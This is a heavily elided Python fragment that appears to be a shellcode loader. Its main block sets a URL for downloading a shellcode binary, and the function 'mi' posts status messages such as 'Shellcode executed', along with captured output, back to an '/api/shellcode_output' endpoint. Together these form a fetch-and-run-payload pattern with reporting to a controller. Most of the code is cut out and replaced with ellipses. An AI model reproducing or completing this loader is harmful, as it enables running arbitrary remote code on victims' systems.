...
def mi(little):   
    ...
    try:
        ...
        if True:
            try:
                send_status('https://127.0.0.1/api/shellcode_output', {'status': 'error', 'message': str(e), 'output': output.getvalue()})
            except Exception:
                pass
        return
    ...
    try:
        ...
        if True:
            try:
                send_status('https://127.0.0.1/api/shellcode_output', {'status': 'success', 'message': 'Shellcode executed', 'output': output.getvalue()})
            except Exception:
                pass
...
if __name__ == "__main__":
    little = "https://127.0.0.1/api/download_shellcode/shellcode_44e71e64.bin"
